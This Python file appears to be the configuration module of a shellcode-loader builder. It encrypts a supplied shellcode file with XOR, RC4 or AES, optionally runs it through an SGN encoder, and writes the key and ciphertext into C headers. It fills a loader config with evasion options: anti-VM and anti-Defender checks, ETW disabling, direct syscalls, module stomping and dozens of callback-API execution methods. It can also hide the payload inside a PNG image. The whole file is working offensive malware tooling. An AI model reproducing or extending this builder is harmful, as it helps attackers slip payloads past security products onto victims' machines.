import os
import secrets
import rc4
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

class ConfigManager:
    def __init__(self):
        current_dir = os.path.dirname(os.path.abspath(__file__))
        self.config_path = os.path.normpath(os.path.join(current_dir, "..", "Loader", "config.h"))
        self.output_dir = os.path.normpath(os.path.join(current_dir, "..", "Loader"))
        self.shellcode_path = ""
        self.key = None
        self.sgn_enabled = False  

        self.execution_methods = ["AlertAPC", "Fiber", "WindowsHook", "EnumCallback"]
        self.encryption_methods = ["CASE_XOR", "CASE_RC4", "CASE_AES"]
        self.enum_methods = [
            "CASE_CertEnumSystemStore", "CASE_CertEnumSystemStoreLocation",
            "CASE_CopyFile2", "CASE_CopyFileEx", "CASE_CreateThreadPoolWait",
            "CASE_CreateTimerQueueTimer", "CASE_CryptEnumOIDInfo",
            "CASE_EnumCalendarInfo", "CASE_EnumCalendarInfoEx",
            "CASE_EnumChildWindows", "CASE_EnumDesktopW",
            "CASE_EnumDesktopWindows", "CASE_EnumDirTreeW",
            "CASE_EnumDisplayMonitors", "CASE_EnumFontFamiliesExW",
            "CASE_EnumFontFamiliesW", "CASE_EnumFontsW",
            "CASE_EnumLanguageGroupLocalesW", "CASE_EnumObjects",
            "CASE_EnumPwrSchemes", "CASE_EnumResourceTypesExW",
            "CASE_EnumResourceTypesW", "CASE_EnumSystemLocales",
            "CASE_EnumThreadWindows", "CASE_EnumTimeFormatsEx",
            "CASE_EnumUILanguagesW", "CASE_EnumWindowStationsW",
            "CASE_EnumWindows", "CASE_EnumerateLoadedModules",
            "CASE_FlsAlloc", "CASE_ImmEnumInputContext",
            "CASE_InitOnceExecuteOnce", "CASE_LdrEnumerateLoadedModules",
            "CASE_lpRtlUserFiberStart", "CASE_SetTimer",
            "CASE_SetupCommitFileQueueW", "CASE_SymFindFileInPath",
            "CASE_SysEnumSourceFiles", "CASE_EnumPageFilesW",
            "CASE_SymEnumProcesses"
        ]
        self.allocate_methods = [
            "CASE_NtAllocateVirtualMemory",
            "CASE_NtMapOfView",
            "CASE_ModuleStomping"
        ]

    def encrypt_xor(self, data, key=None):
        if key is None:
            key = secrets.token_bytes(4)
        key_int = int.from_bytes(key, 'little')
        result = bytearray()
        for i, b in enumerate(data):
            result.append(b ^ ((key_int >> ((i % 4) * 8)) & 0xFF))
        return key, bytes(result)

    def encrypt_rc4(self, data, key=None):
        if key is None:
            key = secrets.token_bytes(16)
        
        def rc4_init(key):
            S = list(range(256))
            j = 0
            for i in range(256):
                j = (j + S[i] + key[i % len(key)]) % 256
                S[i], S[j] = S[j], S[i]
            return S

        def rc4_stream(S):
            i = j = 0
            while True:
                i = (i + 1) % 256
                j = (j + S[i]) % 256
                S[i], S[j] = S[j], S[i]
                yield S[(S[i] + S[j]) % 256]

        S = rc4_init(key)
        keystream = rc4_stream(S)
        result = bytearray()
        for byte in data:
            result.append(byte ^ next(keystream))
        
        return key, bytes(result)

    def encrypt_aes(self, data, key=None):
        if key is None:
            key = secrets.token_bytes(32)
        iv = secrets.token_bytes(16)  
        cipher = AES.new(key, AES.MODE_CBC, iv)
        ct_bytes = cipher.encrypt(pad(data, AES.block_size))
        self.key = iv + key
        return self.key, ct_bytes

    def encrypt_shellcode(self, method):
        with open(self.shellcode_path, 'rb') as f:
            data = f.read()

        if self.sgn_enabled:
            import subprocess
            import os
            
            sgn_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tools", "sgn.exe")
            output_path = os.path.join(os.path.dirname(self.shellcode_path), "res.bin")
            
            try:
                subprocess.run([
                    sgn_path,
                    '-o', output_path,
                    '-c', '17',
                    '-max', '20',
                    '-a', '64',
                    self.shellcode_path
                ], check=True)
                
                with open(output_path, 'rb') as f:
                    data = f.read()
                
                os.remove(output_path)
            except subprocess.CalledProcessError as e:
                raise ValueError(f"SGN处理失败: {str(e)}")
            except Exception as e:
                raise ValueError(f"SGN处理过程出错: {str(e)}")

        if method == "CASE_XOR":
            self.key, encrypted_data = self.encrypt_xor(data)
        elif method == "CASE_RC4":
            self.key, encrypted_data = self.encrypt_rc4(data)
        elif method == "CASE_AES":
            self.key, encrypted_data = self.encrypt_aes(data)
        else:
            raise ValueError(f"Unsupported encryption method: {method}")

        return encrypted_data

    def save_to_header(self, encrypted_data):
        output_path = os.path.join(self.output_dir, "shellcode.h")
        with open(output_path, 'w') as f:
            f.write("#pragma once\n\n")
            
            f.write("unsigned char key[] = {")
            f.write(",".join(f"0x{b:02x}" for b in self.key))
            f.write("};\n")
            f.write(f"unsigned int key_size = {len(self.key)};\n\n")
            f.write("unsigned char shellcode[] = {")
            f.write(",".join(f"0x{b:02x}" for b in encrypted_data))
            f.write("};\n")
            f.write(f"unsigned int shellcode_size = {len(encrypted_data)};\n")
    def save_to_header_placeholder(self, shellcode_size):
        output_path = os.path.join(self.output_dir, "shellcode.h")
        with open(output_path, 'w') as f:
            f.write("#pragma once\n\n")
            if self.key is None:
                raise ValueError("Encryption key is not set")
            f.write("unsigned char key[] = {")
            f.write(",".join(f"0x{b:02x}" for b in self.key))
            f.write("};\n")
            f.write(f"unsigned int key_size = {len(self.key)};\n\n")
            f.write(f"unsigned char shellcode[{shellcode_size}];\n")
            f.write(f"unsigned int shellcode_size = {shellcode_size};\n")
    def update_config(self, settings):
        config_template = '''#pragma once
#include <Windows.h>
#include "Struct.h"
#include "Tools.h"

//  ====================  CONFIG  ==========================
static BOOLEAN isSyscall = {syscall};
static EncryptMethod encryptMethod = {encrypt_method};
static ExecutionMethod ExecMethod = {exec_method};
static EnumMethod enumMethod = {enum_method};
static BOOLEAN EnableAntiVM = {enable_antivm};
static BOOLEAN AntiDefenderVM = {anti_defender};
static BOOLEAN trick_DllGetClassObject = {dll_trick};
static BOOLEAN trick_SxInDll = {sx_trick};
static AllocateMethod allocateMethod = {alloc_method};
static BOOLEAN checkVXQQ = {check_VXQQ};
static BOOLEAN EnableSteg = {enable_steg};
static BOOLEAN DisableETW = {enable_disableETW};
static BOOLEAN EnableMultiplePayloadControl = {enable_payloadControl};
static wchar_t const* stegPath = ENCRYPT_WSTR("\\\\{steg_path}");
// ==================== CONFIG END ==========================
'''
        config_content = config_template.format(
            syscall='TRUE' if settings['syscall'] else 'FALSE',
            encrypt_method=settings['encrypt_method'],
            exec_method=settings['exec_method'],
            enum_method=settings['enum_method'],
            enable_antivm='TRUE' if settings['enable_antivm'] else 'FALSE',
            anti_defender='TRUE' if settings['anti_defender'] else 'FALSE',
            dll_trick='TRUE' if settings['dll_trick'] else 'FALSE',
            sx_trick='TRUE' if settings['sx_trick'] else 'FALSE',
            check_VXQQ='TRUE' if settings['check_VXQQ'] else 'FALSE',
            alloc_method=settings['alloc_method'],
            enable_steg='TRUE' if settings['enable_steg'] else 'FALSE',
            enable_disableETW='TRUE' if settings['enable_disableETW'] else 'FALSE',
            enable_payloadControl='TRUE' if settings['enable_payloadControl'] else 'FALSE',
            steg_path=settings['steg_path'] if settings['steg_path'] else ""
        )

        with open(self.config_path, 'w') as f:
            f.write(config_content)

    def get_settings_from_ui(self, window):
        """Get settings from UI controls"""
        return {
            'syscall': window.syscall_check.isChecked(),
            'encrypt_method': window.encryption_combo.currentText(),
            'exec_method': window.exec_combo.currentText(),
            'enum_method': window.enum_combo.currentText(),
            'enable_antivm': window.anti_vm_check.isChecked(),
            'anti_defender': window.anti_defender_check.isChecked(),
            'dll_trick': window.dll_trick_check.isChecked(),
            'sx_trick': window.sx_trick_check.isChecked(),
            'check_VXQQ': window.vxqq_check.isChecked(),
            'alloc_method': window.alloc_combo.currentText(),
            'enable_steg': window.steg_check.isChecked(),
            'enable_disableETW': window.disable_etw_check.isChecked(),
            'enable_payloadControl': window.payloadControl_check.isChecked(),
            'steg_path': window.steg_name.text()
        }
    def steg_shellcode_to_image(self, shellcode_data, output_path, input_image=None):
        from PIL import Image
        import numpy as np
        
        data_size = len(shellcode_data)
        
        size_bytes = data_size.to_bytes(4, 'little')
        data_to_hide = size_bytes + shellcode_data
        
        bytes_to_hide = len(data_to_hide)
        pixels_needed = (bytes_to_hide * 8 + 2) // 3 
        width = 512
        height = (pixels_needed + width - 1) // width
        
        img_array = np.random.randint(254, 255, (height, width, 3), dtype=np.uint8)
        
        byte_idx = 0
        for y in range(height):
            for x in range(width):
                for c in range(3):
                    if byte_idx < len(data_to_hide):
                        img_array[y, x, c] = data_to_hide[byte_idx]
                        byte_idx += 1
        
        byte_idx = 0
        verify_bytes = bytearray()
        for y in range(height):
            for x in range(width):
                for c in range(3):
                    if byte_idx < len(data_to_hide):
                        verify_bytes.append(img_array[y, x, c])
                        byte_idx += 1
        
        verify_size = int.from_bytes(verify_bytes[:4], 'little')
        print(f"[DEBUG] Original size: {data_size}")
        print(f"[DEBUG] Verified size: {verify_size}")
        print(f"[DEBUG] First few bytes: {[hex(b) for b in verify_bytes[:8]]}")
        
        if verify_size != data_size:
            raise ValueError(f"Size verification failed: {verify_size} != {data_size}")
        
        img = Image.fromarray(img_array)
        img.save(output_path, format='PNG', optimize=False, compress_level=0)
        return True